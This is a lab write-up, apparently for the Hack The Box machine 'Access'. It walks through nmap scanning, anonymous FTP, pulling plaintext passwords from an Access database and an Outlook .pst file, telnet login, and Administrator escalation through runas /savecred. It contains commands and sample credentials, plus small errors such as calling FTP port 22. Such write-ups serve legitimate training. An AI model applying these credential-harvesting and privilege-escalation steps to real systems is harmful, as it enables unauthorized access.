## Access 

### Lab Details 

- Difficulty: Easy
- Type: Telnet, FTP, Priv Esc, Windows

#### Tasks
Q1:How many TCP ports are listening on Access?
- output from nmap `nmap -sT -T4 -vv -A -p- -oA Access 10.10.10.98`
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd (no more connections allowed)
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
```
Q2: What is the filename for the Microsoft Access database available on the host?
 - port 22 (ftp) is open, and based on the output from nmap anonymous login is allowed
 - login to target with anonymous and performed below
```
ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget backup.mdb
```

Q3: What table in the database has user passwords?
- to interact with mdb file, tools like Mdbtools can be installed. 
```
# list tables in mdb
mdb-tables backup.mdb

# list tables 1 table name per line
mdb-tables backup.mdb -1

# output data in a table in json format
mdb-json backup.md auth_user
```
- table auth_user looks interesting below is the data
```
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

Q4: What is the password for Access Control.zip?
- Access Control.zip is located in Engineers directory in target ftp server 
- initially i wanted to crack the password by using `zip2john` and `john`
- however that method did not work then tried using the password found in the mdb file to access it
- password = `access4u@security`

Q5: What is the password for the security user?
- after extracting the zipped file we get Access Control.pst file which is used to stored Microsoft Outlook data
- install `pst-utls` tool to interact with `.pst` file
- we can use `readpst` to get the output 
```
# create a directory for the output to be stored
$: mkdir mail
# -o: output directory 
# -S: input pst file
$: readpst -o mail -S 'Access Control.pst'
$: tree mail
mail
└── Access Control
    └── 2
# password is in the file named '2'
```

Q6: To which open TCP port on Access can we connect to get a shell after logging in as security?
 - theres a open telnet port (23) we can try to connect to it 
 - `telnet target_ip 23`
 - once connected will prompt for username and password 
 - login with password found in the pst file

Q7: Submit the flag located on the security user's desktop.
 -  after gaining shell access execute below to get the flag
 -  `type \Desktop\user.txt

Q8: What is the name of the executable called by the link file on the Public desktop?
 - there is a `.lnk` file located at `C:\Users\Public\Desktop`
 - we can output the link file to acertain the file been executed using`type`
 - `type ZKAccess3.5 Security System.lnk`
```
PS C:\Users\Public\desktop> type "ZKAccess3.5 Security System.lnk"
L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:?
                                                                                                           runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
                                                                                                                                       ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3
               O?j)?H???
                        )??[?_???8{E?3
                                      O?j)?H???
                                               )??[?    ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
```
 - the program thats executed is runas

Q9: What Windows command, when given the /list option, will print information about the stored credentials available to the current user?
 - the Windows command will print stored creds given /list flag is `cmdkeys` - read more on this check out `Windows Privilege Escalation -> Further Credential Theft` module from HTB Academy, goes in depth on this topic
  
Q10: What option can be given to the runas Windows command to have it use the saved credentials and run as that user? Include the leading /.
- flag `/savecred` will use the saved cred instead of user input

Q11: Submit the flag located on the administrator's desktop.
- to get the root flag we will need to contruct the runas command to as below
- running as Administrator to output the root.txt's content to another file 
```
PS C:\Users\Public\desktop> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator

# runas as Administrator to get output from root.txt on C:\Users\Administrator\Desktop and save it to root.txt
C:\Windows\System32\runas.exe /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > root.txt"

# get the flag
cat C:\Windows\System32\root.txt
```


#### Lesson Learned
 - Ways to interact with .mdb files 
 - Ways to interact with .pst files 
